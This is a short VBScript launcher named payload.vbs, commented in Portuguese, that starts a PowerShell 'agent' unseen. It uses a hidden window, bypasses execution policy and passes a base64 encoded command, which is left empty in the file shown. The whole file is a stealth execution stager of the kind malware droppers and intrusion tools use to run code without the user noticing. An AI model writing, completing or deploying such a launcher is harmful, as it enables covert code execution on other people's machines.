' payload.vbs - Executa o agente PowerShell de forma oculta
Set WshShell = CreateObject("WScript.Shell")

' Comando PowerShell codificado em Base64 para evitar problemas com caracteres especiais
encodedCommand = ""

' Monta o comando final para executar PowerShell oculto
psCommand = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand " & encodedCommand

' Executa o comando (0 = janela oculta)
WshShell.Run psCommand, 0, False

